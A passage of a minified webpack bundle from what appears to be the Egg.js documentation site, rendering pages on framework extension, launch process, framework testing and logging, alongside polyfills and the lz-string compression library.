directories and files, such as ",r.a.createElement("code",null,"app")," and ",r.a.createElement("code",null,"config"),". Find more files loaded at ",r.a.createElement(l["Link"],{to:"./loader"},"Loader"),"."),r.a.createElement("h3",{id:"principle-of-framework-extension"},r.a.createElement(l["AnchorLink"],{to:"#principle-of-framework-extension","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Principle of Framework Extension"),r.a.createElement("p",null,"The path of framework is set as a varible named as ",r.a.createElement("code",null,"Symbol.for('egg#eggPath')")," to expose itself to Loader. Why? It seems that the simplest way is to pass a param to the constructor. The reason is to expose those paths of each level of inherited frameworks and reserve their sequences. Since Egg is a framework capable of unlimited inheritance, each layer has to designate their own eggPath so that all the eggPaths are accessiable through the prototype chain."),r.a.createElement("p",null,"Given a triple-layer framework: department level > enterprise level > Egg"),r.a.createElement(o["a"],{code:"// enterprise\nconst Application = require('egg').Application;\nclass Enterprise extends Application {\n  get [EGG_PATH]() {\n    return '/path/to/enterprise';\n  }\n}\n// Customize Application\nexports.Application = Enterprise;\n\n// department\nconst Application = require('enterprise').Application;\n// extend enterprise's Application\nclass department extends Application {\n  get [EGG_PATH]() {\n    return '/path/to/department';\n  }\n}\n\n// the path of `department` have to be designated as described above\nconst Application = require('department').Application;\nconst app = new Application();\napp.ready();",lang:"js"}),r.a.createElement("p",null,"These code are pseudocode to elaborate the framework's loading process, and we have provided scaffolds to ",r.a.createElement(l["Link"],{to:"../core/development"},"development")," and ",r.a.createElement(l["Link"],{to:"../core/deployment"},"deployment"),"."),r.a.createElement("h3",{id:"custom-agent"},r.a.createElement(l["AnchorLink"],{to:"#custom-agent","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Custom Agent"),r.a.createElement("p",null,"Egg's mutilprocess model is composed of Application and Agent. Therefore Agent, another fundamental class similiar to Application, is also required to be implemented."),r.a.createElement(o["a"],{code:"// lib/framework.js\nconst path = require('path');\nconst egg = require('egg');\nconst EGG_PATH = Symbol.for('egg#eggPath');\n\nclass Application extends egg.Application {\n  get [EGG_PATH]() {\n    // return the path of framework\n    return path.dirname(__dirname);\n  }\n}\n\nclass Agent extends egg.Agent {\n  get [EGG_PATH]() {\n    return path.dirname(__dirname);\n  }\n}\n\n// rewrite Egg's Application\nmodule.exports = Object.assign(egg, {\n  Application,\n  Agent,\n});",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"To be careful about that Agent and Application based on the same Class possess different APIs.")),r.a.createElement("h3",{id:"custom-loader"},r.a.createElement(l["AnchorLink"],{to:"#custom-loader","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Custom Loader"),r.a.createElement("p",null,"Loader, the core of the launch process, is capable of loading data code, adjusting loading orders or even strengthen regulation of code."),r.a.createElement("p",null,"As the same as Egg-Path, Loader exposes itself at ",r.a.createElement("code",null,"Symbol.for('egg#loader')")," to ensuer it's accessibility on prototype chain."),r.a.createElement(o["a"],{code:"// lib/framework.js\nconst path = require('path');\nconst egg = require('egg');\nconst EGG_PATH = Symbol.for('egg#eggPath');\n\nclass YadanAppWorkerLoader extends egg.AppWorkerLoader {\n  load() {\n    super.load();\n    // do something\n  }\n}\n\nclass Application extends egg.Application {\n  get [EGG_PATH]() {\n    // return the path of framework\n    return path.dirname(__dirname);\n  }\n  // supplant default Loader\n  get [EGG_LOADER]() {\n    return YadanAppWorkerLoader;\n  }\n}\n\n// rewrite Egg's Application\nmodule.exports = Object.assign(egg, {\n  Application,\n  // custom Loader, a dependence of the high level frameword, needs to be exported.\n  AppWorkerLoader: YadanAppWorkerLoader,\n});",lang:"js"}),r.a.createElement("p",null,"AgentworkerLoader is not going to be described because of it's similarity of AppWorkerLoader, but be aware of it's located at ",r.a.createElement("code",null,"agent.js")," instand of ",r.a.createElement("code",null,"app.js"),"."),r.a.createElement("h2",{id:"the-principle-of-launch"},r.a.createElement(l["AnchorLink"],{to:"#the-principle-of-launch","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"The principle of Launch"),r.a.createElement("p",null,"Many descriptions of launch process are scattered at ",r.a.createElement(l["Link"],{to:"../core/cluster-and-ipc"},"Mutilprocess Model"),", ",r.a.createElement(l["Link"],{to:"./loader"},"Loader")," and ",r.a.createElement(l["Link"],{to:"./plugin"},"Plugin"),", and here is a summarization."),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"startCluster")," is invoked with ",r.a.createElement("code",null,"baseDir")," and ",r.a.createElement("code",null,"framework"),", then Master process is launched."),r.a.createElement("li",null,"Master forks a new process as Agent Worker",r.a.createElement("ul",null,r.a.createElement("li",null,"instantiate Agent Class of the framework loaded from path passed by the ",r.a.createElement("code",null,"framework")," param."),r.a.createElement("li",null,"Agent finds out the AgentWorkerLoader and then starts to load"),r.a.createElement("li",null,"use AgentWorkerLoader to load Worker synchronously in the sequence of Plugin Config, Extend, ",r.a.createElement("code",null,"agent.js")," and other files."),r.a.createElement("li",null,"The initiation of ",r.a.createElement("code",null,"agent.js")," is able to be customized, and it supports asynchronous launch after which it notifies Master and invoke the function passed to ",r.a.createElement("code",null,"beforeStart"),"."))),r.a.createElement("li",null,"After recieving the message that Agent Worker is launched\uff0cMaster forks App Workers by cluster.",r.a.createElement("ul",null,r.a.createElement("li",null,"App Workers are mutilple identical processes launched simultaneously"),r.a.createElement("li",null,"App Worker is instantiated, which is similiar to Agent inherited Application class of framework loaded from framework path."),r.a.createElement("li",null,"The same as Agent, Loading process of Application starts with AppWorkerLoader which loads files in the same order and finally informed Master."))),r.a.createElement("li",null,"After informed of luanching successfully of each App Worker, Master is finally functioning.")),r.a.createElement("h2",{id:"framework-testing"},r.a.createElement(l["AnchorLink"],{to:"#framework-testing","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Framework Testing"),r.a.createElement("p",null,"You'd better read ",r.a.createElement(l["Link"],{to:"../core/unittest"},"unittest")," first, which is similiar to framework testing in a quantity of situations."),r.a.createElement("h3",{id:"initiation"},r.a.createElement(l["AnchorLink"],{to:"#initiation","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Initiation"),r.a.createElement("p",null,"Here are some differences between initiation of frameworks."),r.a.createElement(o["a"],{code:"const mock = require('egg-mock');\ndescribe('test/index.test.js', () => {\n  let app;\n  before(() => {\n    app = mock.app({\n      // test/fixtures/apps/example\n      baseDir: 'apps/example',\n      // importent !! Do not miss\n      framework: true,\n    });\n    return app.ready();\n  });\n\n  after(() => app.close());\n  afterEach(mock.restore);\n\n  it('should success', () => {\n    return app.httpRequest().get('/').expect(200);\n  });\n});",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"Different from application testing, framework testing tests framework code instead of application code, so that baseDir varies for the propose of testing kinds of applications."),r.a.createElement("li",null,"BaseDir is potentially considered to be under the path of ",r.a.createElement("code",null,"test/fixtures"),", otherwise it should be absolute paths."),r.a.createElement("li",null,"The ",r.a.createElement("code",null,"framework")," option is indispensable, which could be a absolute path or ",r.a.createElement("code",null,"true")," meaning the path of the framework to be current directory."),r.a.createElement("li",null,"The use of the app should wait for the ",r.a.createElement("code",null,"ready")," event in ",r.a.createElement("code",null,"before")," hook, or some of the APIs is not avaiable."),r.a.createElement("li",null,"Do not forget to invoke ",r.a.createElement("code",null,"app.close()")," after testing, which could arouse the exhausting of fds, caused by unclosed log files.")),r.a.createElement("h3",{id:"cache"},r.a.createElement(l["AnchorLink"],{to:"#cache","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Cache"),r.a.createElement("p",null,r.a.createElement("code",null,"mm.app")," enables cache as default, which means new envoriment setting would not work once loaded."),r.a.createElement(o["a"],{code:"const mock = require('egg-mock');\ndescribe('/test/index.test.js', () => {\n  let app;\n  afterEach(() => app.close());\n\n  it('should test on local', () => {\n    mock.env('local');\n    app = mock.app({\n      baseDir: 'apps/example',\n      framework: true,\n      cache: false,\n    });\n    return app.ready();\n  });\n  it('should test on prod', () => {\n    mock.env('prod');\n    app = mock.app({\n      baseDir: 'apps/example',\n      framework: true,\n      cache: false,\n    });\n    return app.ready();\n  });\n});",lang:"js"}),r.a.createElement("h3",{id:"multipleprocess-testing"},r.a.createElement(l["AnchorLink"],{to:"#multipleprocess-testing","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Multipleprocess Testing"),r.a.createElement("p",null,"Mutilprocess is rarely tested because of the high cost and the unavailability of API level's mock, meanwhile, processes have a slow start or even timeout, but it still remains the most effective way of testing multiprocess model."),r.a.createElement("p",null,"The option of ",r.a.createElement("code",null,"mock.cluster")," have no difference with ",r.a.createElement("code",null,"mm.app")," while their APIs are totally distinct, however, SuperTest still works."),r.a.createElement(o["a"],{code:"const mock = require('egg-mock');\ndescribe('/test/index.test.js', () => {\n  let app;\n  before(() => {\n    app = mock.cluster({\n      baseDir: 'apps/example',\n      framework: true,\n    });\n    return app.ready();\n  });\n  after(() => app.close());\n  afterEach(mock.restore);\n  it('should success', () => {\n    return app.httpRequest().get('/').expect(200);\n  });\n});",lang:"js"}),r.a.createElement("p",null,"Tests of ",r.a.createElement("code",null,"stdout/stderr")," are also avaiable, since ",r.a.createElement("code",null,"mm.cluster")," is based on ",r.a.createElement(l["Link"],{to:"https://github.com/popomore/coffee"},"coffee")," in which multiprocess testing is supported."),r.a.createElement(o["a"],{code:"const mock = require('egg-mock');\ndescribe('/test/index.test.js', () => {\n  let app;\n  before(() => {\n    app = mock.cluster({\n      baseDir: 'apps/example',\n      framework: true,\n    });\n    return app.ready();\n  });\n  after(() => app.close());\n  it('should get `started`', () => {\n    // set the expectation of console\n    app.expect('stdout', /started/);\n  });\n});",lang:"js"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},FBfE:function(e,t,n){"use strict";var a=n("0mt+"),r=n("+7qM"),l=n("tS9j"),o=n("Pgx2");a({target:"String",proto:!0,forced:!o("includes")},{includes:function(e){return!!~String(l(this)).indexOf(r(e),arguments.length>1?arguments[1]:void 0)}})},FC4M:function(e,t,n){"use strict";function a(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}n.d(t,"a",(function(){return a}))},FF6X:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("V3tB"),o=n("oyD1"),i=n("XaNN"),c=n("j9ts"),s=n("NBU9");a({target:"Set",proto:!0,real:!0,forced:r},{intersection:function(e){var t=o(this),n=new(c(t,l("Set"))),a=i(t.has),r=i(n.add);return s(e,(function(e){a.call(t,e)&&r.call(n,e)})),n}})},FU0I:function(e,t,n){"use strict";e.exports=n("0Lmz")},Flpl:function(e,t,n){var a,r=function(){var e=String.fromCharCode,t="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",n="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+-$",a={};function r(e,t){if(!a[e]){a[e]={};for(var n=0;n<e.length;n++)a[e][e.charAt(n)]=n}return a[e][t]}var l={compressToBase64:function(e){if(null==e)return"";var n=l._compress(e,6,(function(e){return t.charAt(e)}));switch(n.length%4){default:case 0:return n;case 1:return n+"===";case 2:return n+"==";case 3:return n+"="}},decompressFromBase64:function(e){return null==e?"":""==e?null:l._decompress(e.length,32,(function(n){return r(t,e.charAt(n))}))},compressToUTF16:function(t){return null==t?"":l._compress(t,15,(function(t){return e(t+32)}))+" "},decompressFromUTF16:function(e){return null==e?"":""==e?null:l._decompress(e.length,16384,(function(t){return e.charCodeAt(t)-32}))},compressToUint8Array:function(e){for(var t=l.compress(e),n=new Uint8Array(2*t.length),a=0,r=t.length;a<r;a++){var o=t.charCodeAt(a);n[2*a]=o>>>8,n[2*a+1]=o%256}return n},decompressFromUint8Array:function(t){if(null===t||void 0===t)return l.decompress(t);for(var n=new Array(t.length/2),a=0,r=n.length;a<r;a++)n[a]=256*t[2*a]+t[2*a+1];var o=[];return n.forEach((function(t){o.push(e(t))})),l.decompress(o.join(""))},compressToEncodedURIComponent:function(e){return null==e?"":l._compress(e,6,(function(e){return n.charAt(e)}))},decompressFromEncodedURIComponent:function(e){return null==e?"":""==e?null:(e=e.replace(/ /g,"+"),l._decompress(e.length,32,(function(t){return r(n,e.charAt(t))})))},compress:function(t){return l._compress(t,16,(function(t){return e(t)}))},_compress:function(e,t,n){if(null==e)return"";var a,r,l,o={},i={},c="",s="",u="",d=2,m=3,p=2,h=[],g=0,f=0;for(l=0;l<e.length;l+=1)if(c=e.charAt(l),Object.prototype.hasOwnProperty.call(o,c)||(o[c]=m++,i[c]=!0),s=u+c,Object.prototype.hasOwnProperty.call(o,s))u=s;else{if(Object.prototype.hasOwnProperty.call(i,u)){if(u.charCodeAt(0)<256){for(a=0;a<p;a++)g<<=1,f==t-1?(f=0,h.push(n(g)),g=0):f++;for(r=u.charCodeAt(0),a=0;a<8;a++)g=g<<1|1&r,f==t-1?(f=0,h.push(n(g)),g=0):f++,r>>=1}else{for(r=1,a=0;a<p;a++)g=g<<1|r,f==t-1?(f=0,h.push(n(g)),g=0):f++,r=0;for(r=u.charCodeAt(0),a=0;a<16;a++)g=g<<1|1&r,f==t-1?(f=0,h.push(n(g)),g=0):f++,r>>=1}d--,0==d&&(d=Math.pow(2,p),p++),delete i[u]}else for(r=o[u],a=0;a<p;a++)g=g<<1|1&r,f==t-1?(f=0,h.push(n(g)),g=0):f++,r>>=1;d--,0==d&&(d=Math.pow(2,p),p++),o[s]=m++,u=String(c)}if(""!==u){if(Object.prototype.hasOwnProperty.call(i,u)){if(u.charCodeAt(0)<256){for(a=0;a<p;a++)g<<=1,f==t-1?(f=0,h.push(n(g)),g=0):f++;for(r=u.charCodeAt(0),a=0;a<8;a++)g=g<<1|1&r,f==t-1?(f=0,h.push(n(g)),g=0):f++,r>>=1}else{for(r=1,a=0;a<p;a++)g=g<<1|r,f==t-1?(f=0,h.push(n(g)),g=0):f++,r=0;for(r=u.charCodeAt(0),a=0;a<16;a++)g=g<<1|1&r,f==t-1?(f=0,h.push(n(g)),g=0):f++,r>>=1}d--,0==d&&(d=Math.pow(2,p),p++),delete i[u]}else for(r=o[u],a=0;a<p;a++)g=g<<1|1&r,f==t-1?(f=0,h.push(n(g)),g=0):f++,r>>=1;d--,0==d&&(d=Math.pow(2,p),p++)}for(r=2,a=0;a<p;a++)g=g<<1|1&r,f==t-1?(f=0,h.push(n(g)),g=0):f++,r>>=1;while(1){if(g<<=1,f==t-1){h.push(n(g));break}f++}return h.join("")},decompress:function(e){return null==e?"":""==e?null:l._decompress(e.length,32768,(function(t){return e.charCodeAt(t)}))},_decompress:function(t,n,a){var r,l,o,i,c,s,u,d=[],m=4,p=4,h=3,g="",f=[],E={val:a(0),position:n,index:1};for(r=0;r<3;r+=1)d[r]=r;o=0,c=Math.pow(2,2),s=1;while(s!=c)i=E.val&E.position,E.position>>=1,0==E.position&&(E.position=n,E.val=a(E.index++)),o|=(i>0?1:0)*s,s<<=1;switch(o){case 0:o=0,c=Math.pow(2,8),s=1;while(s!=c)i=E.val&E.position,E.position>>=1,0==E.position&&(E.position=n,E.val=a(E.index++)),o|=(i>0?1:0)*s,s<<=1;u=e(o);break;case 1:o=0,c=Math.pow(2,16),s=1;while(s!=c)i=E.val&E.position,E.position>>=1,0==E.position&&(E.position=n,E.val=a(E.index++)),o|=(i>0?1:0)*s,s<<=1;u=e(o);break;case 2:return""}d[3]=u,l=u,f.push(u);while(1){if(E.index>t)return"";o=0,c=Math.pow(2,h),s=1;while(s!=c)i=E.val&E.position,E.position>>=1,0==E.position&&(E.position=n,E.val=a(E.index++)),o|=(i>0?1:0)*s,s<<=1;switch(u=o){case 0:o=0,c=Math.pow(2,8),s=1;while(s!=c)i=E.val&E.position,E.position>>=1,0==E.position&&(E.position=n,E.val=a(E.index++)),o|=(i>0?1:0)*s,s<<=1;d[p++]=e(o),u=p-1,m--;break;case 1:o=0,c=Math.pow(2,16),s=1;while(s!=c)i=E.val&E.position,E.position>>=1,0==E.position&&(E.position=n,E.val=a(E.index++)),o|=(i>0?1:0)*s,s<<=1;d[p++]=e(o),u=p-1,m--;break;case 2:return f.join("")}if(0==m&&(m=Math.pow(2,h),h++),d[u])g=d[u];else{if(u!==p)return null;g=l+l.charAt(0)}f.push(g),d[p++]=l+g.charAt(0),m--,l=g,0==m&&(m=Math.pow(2,h),h++)}}};return l}();a=function(){return r}.call(t,n,t,e),void 0===a||(e.exports=a)},FnX0:function(e,t,n){"use strict";n.d(t,"a",(function(){return s}));var a=n("0YMn"),r=n("FU0I"),l=n("d9lq"),o=0,i=Object(l["a"])();function c(){var e;return i?(e=o,o+=1):e="TEST_OR_SSR",e}function s(e){var t=r["useState"](),n=Object(a["a"])(t,2),l=n[0],o=n[1];return r["useEffect"]((function(){o("rc_select_".concat(c()))}),[]),e||l}},Fndp:function(e,t,n){var a=n("a7jj"),r=n("4bQT");e.exports=function(e,t,n){var l,o;return r&&"function"==typeof(l=t.constructor)&&l!==n&&a(o=l.prototype)&&o!==n.prototype&&r(e,o),e}},FsiO:function(e,t,n){var a=n("A0UU"),r=n("7Vsj").trim,l=n("4avo"),o=a.parseFloat,i=1/o(l+"-0")!==-1/0;e.exports=i?function(e){var t=r(String(e)),n=o(t);return 0===n&&"-"==t.charAt(0)?-0:n}:o},"G/H9":function(e,t,n){"use strict";var a=n("0mt+"),r=n("7Vsj").end,l=n("4BFV"),o=l("trimEnd"),i=o?function(){return r(this)}:"".trimEnd;a({target:"String",proto:!0,forced:o},{trimEnd:i,trimRight:i})},G01i:function(e,t,n){},G0Yp:function(e,t,n){"use strict";var a=Object.getOwnPropertySymbols,r=Object.prototype.hasOwnProperty,l=Object.prototype.propertyIsEnumerable;function o(e){if(null===e||void 0===e)throw new TypeError("Object.assign cannot be called with null or undefined");return Object(e)}function i(){try{if(!Object.assign)return!1;var e=new String("abc");if(e[5]="de","5"===Object.getOwnPropertyNames(e)[0])return!1;for(var t={},n=0;n<10;n++)t["_"+String.fromCharCode(n)]=n;var a=Object.getOwnPropertyNames(t).map((function(e){return t[e]}));if("0123456789"!==a.join(""))return!1;var r={};return"abcdefghijklmnopqrst".split("").forEach((function(e){r[e]=e})),"abcdefghijklmnopqrst"===Object.keys(Object.assign({},r)).join("")}catch(l){return!1}}e.exports=i()?Object.assign:function(e,t){for(var n,i,c=o(e),s=1;s<arguments.length;s++){for(var u in n=Object(arguments[s]),n)r.call(n,u)&&(c[u]=n[u]);if(a){i=a(n);for(var d=0;d<i.length;d++)l.call(n,i[d])&&(c[i[d]]=n[i[d]])}}return c}},G0w1:function(e,t){var n=1/0,a=Math.abs,r=Math.pow,l=Math.floor,o=Math.log,i=Math.LN2,c=function(e,t,c){var s,u,d,m=new Array(c),p=8*c-t-1,h=(1<<p)-1,g=h>>1,f=23===t?r(2,-24)-r(2,-77):0,E=e<0||0===e&&1/e<0?1:0,b=0;for(e=a(e),e!=e||e===n?(u=e!=e?1:0,s=h):(s=l(o(e)/i),e*(d=r(2,-s))<1&&(s--,d*=2),e+=s+g>=1?f/d:f*r(2,1-g),e*d>=2&&(s++,d/=2),s+g>=h?(u=0,s=h):s+g>=1?(u=(e*d-1)*r(2,t),s+=g):(u=e*r(2,g-1)*r(2,t),s=0));t>=8;m[b++]=255&u,u/=256,t-=8);for(s=s<<t|u,p+=t;p>0;m[b++]=255&s,s/=256,p-=8);return m[--b]|=128*E,m},s=function(e,t){var a,l=e.length,o=8*l-t-1,i=(1<<o)-1,c=i>>1,s=o-7,u=l-1,d=e[u--],m=127&d;for(d>>=7;s>0;m=256*m+e[u],u--,s-=8);for(a=m&(1<<-s)-1,m>>=-s,s+=t;s>0;a=256*a+e[u],u--,s-=8);if(0===m)m=1-c;else{if(m===i)return a?NaN:d?-n:n;a+=r(2,t),m-=c}return(d?-1:1)*a*r(2,m-t)};e.exports={pack:c,unpack:s}},G9w8:function(e,t,n){var a=n("XaNN");e.exports=function(e,t,n){if(a(e),void 0===t)return e;switch(n){case 0:return function(){return e.call(t)};case 1:return function(n){return e.call(t,n)};case 2:return function(n,a){return e.call(t,n,a)};case 3:return function(n,a,r){return e.call(t,n,a,r)}}return function(){return e.apply(t,arguments)}}},GD5l:function(e,t,n){var a=n("0mt+");a({target:"Math",stat:!0},{imulh:function(e,t){var n=65535,a=+e,r=+t,l=a&n,o=r&n,i=a>>16,c=r>>16,s=(i*o>>>0)+(l*o>>>16);return i*c+(s>>16)+((l*c>>>0)+(s&n)>>16)}})},GIAz:function(e,t){e.exports={}},GK2W:function(e,t,n){"use strict";var a=n("0mt+"),r=n("Xdqv"),l=n("Dx5A"),o=n("oyD1"),i=n("wzTy"),c=n("N0Us"),s=n("j9ts"),u=l.ArrayBuffer,d=l.DataView,m=u.prototype.slice,p=r((function(){return!new u(2).slice(1,void 0).byteLength}));a({target:"ArrayBuffer",proto:!0,unsafe:!0,forced:p},{slice:function(e,t){if(void 0!==m&&void 0===t)return m.call(o(this),e);var n=o(this).byteLength,a=i(e,n),r=i(void 0===t?n:t,n),l=new(s(this,u))(c(r-a)),p=new d(this),h=new d(l),g=0;while(a<r)h.setUint8(g++,p.getUint8(a++));return l}})},Gaq5:function(e,t,n){"use strict";function a(e){if(Array.isArray(e))return e}function r(e,t){var n=null==e?null:"undefined"!==typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=n){var a,r,l=[],o=!0,i=!1;try{for(n=n.call(e);!(o=(a=n.next()).done);o=!0)if(l.push(a.value),t&&l.length===t)break}catch(c){i=!0,r=c}finally{try{o||null==n["return"]||n["return"]()}finally{if(i)throw r}}return l}}function l(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}function o(e,t){if(e){if("string"===typeof e)return l(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?l(e,t):void 0}}function i(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function c(e,t){return a(e)||r(e,t)||o(e,t)||i()}n.d(t,"a",(function(){return c}))},Gzht:function(e,t,n){var a=n("0mt+"),r=n("ma9u"),l=n("V3tB"),o=n("tbdv"),i=function(){var e=l("Object","freeze");return e?e(o(null)):o(null)};a({global:!0},{compositeKey:function(){return r.apply(Object,arguments).get("object",i)}})},H6EV:function(e,t,n){"use strict";var a=n("0mt+"),r=n("9Rcy"),l=n("XejE"),o=n("m/os"),i=n("PE5i"),c=n("Yftc"),s=n("vr25").f;r&&a({target:"Object",proto:!0,forced:l},{__lookupGetter__:function(e){var t,n=o(this),a=i(e,!0);do{if(t=s(n,a))return t.get}while(n=c(n))}})},HMVt:function(e,t,n){},HMha:function(e,t,n){var a=n("9u3R"),r=function(){return a.Date.now()};e.exports=r},HZZr:function(e,t,n){var a=n("0mt+"),r=n("7un0"),l=n("oyD1"),o=r.has,i=r.toKey;a({target:"Reflect",stat:!0},{hasOwnMetadata:function(e,t){var n=arguments.length<3?void 0:i(arguments[2]);return o(e,l(t),n)}})},HmG0:function(e,t,n){var a=n("a7jj"),r=n("YtQ9"),l=n("q7Pv"),o=l("species");e.exports=function(e,t){var n;return r(e)&&(n=e.constructor,"function"!=typeof n||n!==Array&&!r(n.prototype)?a(n)&&(n=n[o],null===n&&(n=void 0)):n=void 0),new(void 0===n?Array:n)(0===t?0:t)}},HoWz:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"There is no doubt that logs are important part for monitoring application and debugging in Web development."),r.a.createElement("p",null,"Built-in enterprise scaled logger, ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-logger"},"egg-logger"),", makes developer implement logging more easily than ever before."),r.a.createElement("p",null,"Core features:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Levels"),r.a.createElement("li",null,"Universal logging, ",r.a.createElement("code",null,".error()")," will save ",r.a.createElement("code",null,"ERROR")," level logs into a file for later debugging"),r.a.createElement("li",null,"Logs from dispatch and runtime are separated"),r.a.createElement("li",null,"Create your logger"),r.a.createElement("li",null,"Multi-process logs"),r.a.createElement("li",null,"Automatic sharding"),r.a.createElement("li",null,"High Performance")),r.a.createElement("h2",{id:"location"},r.a.createElement(l["AnchorLink"],{to:"#location","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Location"),r.a.createElement("ul",null,r.a.createElement("li",null,"Log files are located in ",r.a.createElement("code",null,"$","{","appInfo.root","}","/logs/$","{","appInfo.name","}")," by default. For instance, ",r.a.createElement("code",null,"/home/admin/logs/example-app"),"."),r.a.createElement("li",null,"To avoid conflicts between environments and provide a more convenience way to manage logs, log files will be written into ",r.a.createElement("code",null,"logs")," directory. For instance, ",r.a.createElement("code",null,"/path/to/example-app/logs/example-app"),".")),r.a.createElement("p",null,"Change ",r.a.createElement("code",null,"dir")," in logger:"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nexports.logger = {\n  dir: '/path/to/your/custom/log/dir',\n};",lang:"js"}),r.a.createElement("h2",{id:"type-of-logs"},r.a.createElement(l["AnchorLink"],{to:"#type-of-logs","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Type of Logs"),r.a.createElement("p",null,"Egg offers a few loggers for different scenarios:"),r.a.createElement("ul",null,r.a.createElement("li",null,"appLogger ",r.a.createElement("code",null,"$","{","appInfo.name","}","-web.log"),"\uff0cfor example ",r.a.createElement("code",null,"example-app-web.log")," stores logs from application, it will be used in general."),r.a.createElement("li",null,"coreLogger ",r.a.createElement("code",null,"egg-web.log"),", logs from Egg's core and plugin."),r.a.createElement("li",null,"errorLogger ",r.a.createElement("code",null,"common-error.log")," should not be invoked directly. However, ",r.a.createElement("code",null,".error()")," in every logger will redirect logs to it for debugging."),r.a.createElement("li",null,"agentLogger ",r.a.createElement("code",null,"egg-agent.log"),", logs from agent process.")),r.a.createElement("p",null,"If you want to change names of above loggers, you can override them in config:"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nmodule.exports = (appInfo) => {\n  return {\n    logger: {\n      appLogName: `${appInfo.name}-web.log`,\n      coreLogName: 'egg-web.log',\n      agentLogName: 'egg-agent.log',\n      errorLogName: 'common-error.log',\n    },\n  };\n};",lang:"js"}),r.a.createElement("h2",{id:"printing"},r.a.createElement(l["AnchorLink"],{to:"#printing","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Printing"),r.a.createElement("h3",{id:"context-logger"},r.a.createElement(l["AnchorLink"],{to:"#context-logger","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Context Logger"),r.a.createElement("p",null,"It's proper to log details in requests with context logger. The logger will append basics about requests to each log. For example, ",r.a.createElement("code",null,"[$userId/$ip/$traceId/$","{","cost","}","ms $method $url]"),"."),r.a.createElement(o["a"],{code:"ctx.logger.debug('debug info');\nctx.logger.info('some request data: %j', ctx.request.body);\nctx.logger.warn('WARNING!!!!');\n\n// .error will save information in call stack into errorLog file.\n// Exceptions must be guaranteed to be Error or object extended from Error, which offers a trace of what functions were called.\nctx.logger.error(new Error('whoops'));",lang:"js"}),r.a.createElement("p",null,"For developers who create frameworks or plugins, ",r.a.createElement("code",null,"ctx.coreLogger")," is another option in Context Logger."),r.a.createElement(o["a"],{code:"ctx.coreLogger.info('info');",lang:"js"}),r.a.createElement("h3",{id:"app-logger"},r.a.createElement(l["AnchorLink"],{to:"#app-logger","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"App Logger"),r.a.createElement("p",null,"For developers who want to know more details about dispatch in Egg, they can easily use ",r.a.createElement("code",null,"App Logger")," to make that happen:"),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.logger.debug('debug info');\n  app.logger.info('Latency: %d ms', Date.now() - start);\n  app.logger.warn('warning!');\n\n  app.logger.error(someErrorObj);\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("code",null,"app.coreLogger")," in app is similar to ",r.a.createElement("code",null,"ctx.coreLogger")," in context:"),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.coreLogger.info('Latency: %d ms', Date.now() - start);\n};",lang:"js"}),r.a.createElement("h3",{id:"agent-logger"},r.a.createElement(l["AnchorLink"],{to:"#agent-logger","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Agent Logger"),r.a.createElement("p",null,"Agent also supports ",r.a.createElement("code",null,"agent.coreLogger")," as the same feature to context and app above."),r.a.createElement(o["a"],{code:"// agent.js\nmodule.exports = (agent) => {\n  agent.logger.debug('debug info');\n  agent.logger.info('Latency: %d ms', Date.now() - start);\n  agent.logger.warn('warning!');\n\n  agent.logger.error(someErrorObj);\n};",lang:"js"}),r.a.createElement("p",null,"For more about Agent, you can take a look at 